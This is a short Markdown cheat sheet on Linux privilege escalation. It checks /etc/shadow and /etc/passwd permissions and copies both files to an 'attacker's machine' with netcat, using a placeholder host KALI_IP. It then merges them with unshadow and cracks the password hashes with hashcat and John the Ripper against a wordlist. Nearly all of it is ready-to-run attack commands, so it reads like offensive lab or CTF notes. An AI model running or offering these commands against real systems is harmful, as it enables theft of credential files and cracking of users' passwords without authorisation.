#### Check `Shadow` File Permission
```
ls -al /etc/shadow
```
If the file has `w` permission under ***group (Users who belong to the file's group)*** i.e. `-rw-rw-r--`. We can copy the content of the file:

#### Check `passwd` file permission
```
ls -al /etc/passwd
```

#### Save the output on the Attacker's Machine with `nc`
Copying and saving the `shadow` and the `passwd` file on the attacker's machine with `nc` tool.

**Attacker's Machine**
```
nc -nvlp 4444 > shadow
```

**Victim's Machine**
```
nc KALI_IP 4444 < /etc/shadow
```

**Attacker's Machine**
```
nc -nvlp 4444 > passwd
```

**Victim's Machine**
```
nc KALI_IP 4444 < /etc/passwd
```

#### `unshadow` Files
When `unshadowing` files, the **passwd** file should be at the beginning.

**Attacker's Machine**
```
unshadow passwd shadow > unshadow.txt
```

#### Brute Force the Hash
**Attackers Machine**

**Hashcat**
```
hashcat -m 1800 unshadow.txt rockyou.txt -O
```
- `-O`: **Optimized kernel** mode, it tells Hashcat to use more efficient and faster kernel for cracking passwords, but with certain limitations.

**John The Ripper**
```
john --wordlist=rockyou.txt unshadow.txt
```

**View Cracker Passwords**
```
john --show unshadow.txt
```